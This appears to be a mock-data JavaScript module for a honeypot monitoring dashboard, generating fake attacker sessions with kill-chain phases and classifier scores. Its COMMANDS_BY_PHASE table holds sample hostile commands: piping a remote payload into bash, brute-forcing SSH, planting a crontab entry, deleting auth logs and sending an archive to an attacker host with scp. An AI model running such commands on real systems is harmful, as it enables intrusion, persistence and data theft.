// DEVELOPMENT / DEMO MOCK DATA ONLY.
//
// Shapes here intentionally mirror the real traffic_gateway/api.py responses
// (/api/mt3-results, /api/stats, /api/active-config, /api/live-access,
// /api/health) so that swapping frontend/src/services/api.js from mock to
// live fetches later requires no component changes. Nothing here is written
// back into the project's real logs or datasets.

import { KILL_CHAIN_PHASES, MICRO_STATES } from '../lib/schema'

function pick(arr) {
  return arr[Math.floor(Math.random() * arr.length)]
}

const SAMPLE_IPS = [
  '203.0.113.44', '198.51.100.7', '192.0.2.19', '45.83.64.12',
  '185.220.101.5', '103.42.19.88', '192.168.1.101', '172.16.0.12',
]

const SAMPLE_STATES = MICRO_STATES.filter((m) => m.realData || m.id % 3 === 0)

const PROTOCOL_BY_TARGET = {
  SSH_HONEYPOT: 'SSH',
  HTTP_HONEYPOT: 'HTTP',
  DB_HONEYPOT: 'PostgreSQL',
}
const PORT_BY_TARGET = { SSH_HONEYPOT: 22, HTTP_HONEYPOT: 80, DB_HONEYPOT: 5432 }
const HONEYPOT_TARGETS = Object.keys(PROTOCOL_BY_TARGET)
const SESSION_STATUSES = ['active', 'idle', 'closed']

// Mirrors real command_text-style values the pipeline would carry for a
// session at this phase, for a plausible-looking timeline/command list.
const COMMANDS_BY_PHASE = {
  0: ['nmap -sV 10.0.0.5', 'ping -c 1 10.0.0.5'],
  1: ['ssh root@10.0.0.5', 'hydra -l root -P rockyou.txt ssh://10.0.0.5'],
  2: ['/bin/sh -i', 'curl http://45.83.64.12/payload.sh | bash'],
  3: ['ps aux', 'whoami', 'cat /etc/passwd'],
  4: ['sudo -l', 'find / -perm -4000 2>/dev/null'],
  5: ['crontab -l', 'echo "* * * * * /tmp/.x" >> /etc/crontab'],
  6: ['history -c', 'rm -f /var/log/auth.log'],
  7: ['ssh deploy@10.0.0.9', 'scp id_rsa deploy@10.0.0.9:'],
  8: ['tar czf /tmp/data.tar.gz /etc', 'scp /tmp/data.tar.gz attacker@203.0.113.44:'],
}

// Small local duplicate of RiskBadge's phaseToRisk (components/common/RiskBadge.jsx)
// so this data module doesn't depend on a component file. Keep the two in sync.
function phaseToRisk(phaseId) {
  if (phaseId >= 7) return 'critical'
  if (phaseId >= 4) return 'high'
  if (phaseId >= 2) return 'medium'
  return 'low'
}

function buildTimeline(state, phase, tStartMs, durationMs, confidence) {
  const steps = [
    { offset: 0, label: 'Connection established', detail: 'TCP handshake completed with the gateway' },
    { offset: 0.15, label: 'Authentication attempt', detail: 'Credential pair submitted to the honeypot' },
    { offset: 0.4, label: 'Command observed', detail: `Shell activity consistent with ${phase.name}` },
    { offset: 0.65, label: 'Payload activity detected', detail: 'Behavioral signals captured for feature extraction' },
    { offset: 0.85, label: 'ML classification generated', detail: `MT3 → ${state.label} (p=${confidence.toFixed(3)})` },
    { offset: 1.0, label: 'Adaptive decision generated', detail: 'Honeypot interaction level updated' },
  ]
  return steps.map((s) => ({
    ts: new Date(tStartMs + s.offset * durationMs).toISOString(),
    label: s.label,
    detail: s.detail,
  }))
}

function makeSession(i) {
  const state = pick(SAMPLE_STATES)
  const phase = KILL_CHAIN_PHASES[state.phase]
  const prevPhase = KILL_CHAIN_PHASES[Math.max(0, state.phase - 1)]
  const confidence = Math.round((0.55 + Math.random() * 0.44) * 1000) / 1000
  const gatewayScore = Math.round(Math.random() * 1000) / 1000
  const target = pick(HONEYPOT_TARGETS)
  const status = pick(SESSION_STATUSES)
  const durationS = Math.round(20 + Math.random() * 600)
  const lastActivityMs = Date.now() - i * 1000 * 60 * (2 + Math.random() * 8)
  const firstSeenMs = lastActivityMs - durationS * 1000

  return {
    session_id: `SES-${String(i + 1).padStart(3, '0')}`,
    src_ip: pick(SAMPLE_IPS),
    protocol: PROTOCOL_BY_TARGET[target],
    honeypot_target: target,
    destination: `10.0.0.5:${PORT_BY_TARGET[target]}`,
    src_port: 40000 + Math.floor(Math.random() * 20000),
    dst_port: PORT_BY_TARGET[target],
    status,
    risk: phaseToRisk(state.phase),
    timestamp: new Date(lastActivityMs).toISOString(),
    first_seen: new Date(firstSeenMs).toISOString(),
    duration_s: durationS,
    micro_state: state.label,
    mitre: state.mitre,
    phase: state.phase,
    phase_name: phase.name,
    confidence,
    top3: [
      { label: state.label, prob: confidence },
      { label: pick(SAMPLE_STATES).label, prob: Math.round((1 - confidence) * 0.6 * 1000) / 1000 },
      { label: pick(SAMPLE_STATES).label, prob: Math.round((1 - confidence) * 0.4 * 1000) / 1000 },
    ],
    gateway_score: gatewayScore,
    rule_label: state.label,
    kcvr_valid: Math.random() > 0.3,
    config_changed: Math.random() > 0.6,
    interaction_level: phase.interaction,
    previous_interaction_level: prevPhase.interaction,
    adaptive_reason:
      `Phase ${Math.max(0, state.phase - 1)}→${state.phase}, interaction ` +
      `${prevPhase.interaction}→${phase.interaction}: ${state.label} detected (p=${confidence.toFixed(3)})`,
    login_attempts: Math.floor(Math.random() * 5) + (state.phase >= 1 ? 1 : 0),
    commands: COMMANDS_BY_PHASE[state.phase] ?? [],
    timeline: buildTimeline(state, phase, firstSeenMs, durationS * 1000, confidence),
  }
}

export const mockLiveSessions = Array.from({ length: 24 }, (_, i) => makeSession(i))
  .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))

export function getSessionById(sessionId) {
  return mockLiveSessions.find((s) => s.session_id === sessionId)
}

// Single source of truth for the summary numbers shown on the Dashboard's
// metric cards and Live Sessions' metric cards — both pages call this so the
// two views can never disagree about what "24 sessions" means.
export function getSessionSummary(sessions = mockLiveSessions) {
  const active = sessions.filter((s) => s.status === 'active').length
  const highRisk = sessions.filter((s) => s.risk === 'high' || s.risk === 'critical').length
  const avgConfidence = sessions.length
    ? sessions.reduce((sum, s) => sum + s.confidence, 0) / sessions.length
    : 0
  return { active, total: sessions.length, highRisk, avgConfidence }
}

// Stage 6B cleanup: this file previously also exported `mockStats` (mostly
// dead fields like blocked_ips/tracked_ips/mean_confidence that nothing
// read, plus a `phase_distribution` that duplicated logic already computed
// independently — and consistently — inside ThreatDistributionDonut.jsx),
// plus `mockActiveConfig`/`mockConfigChanges`/`mockGatewayHealth`, which
// were Stage 1 placeholders for the Honeypot Configuration page. Stage 5A
// wired that page to the real GET /api/active-config and
// GET /api/config-changes instead, so those three had been dead code ever
// since — confirmed via a repo-wide search before removing them. Only the
// one field anything still used is kept below.
export const MOCK_DATA_GENERATED_AT = new Date().toISOString()
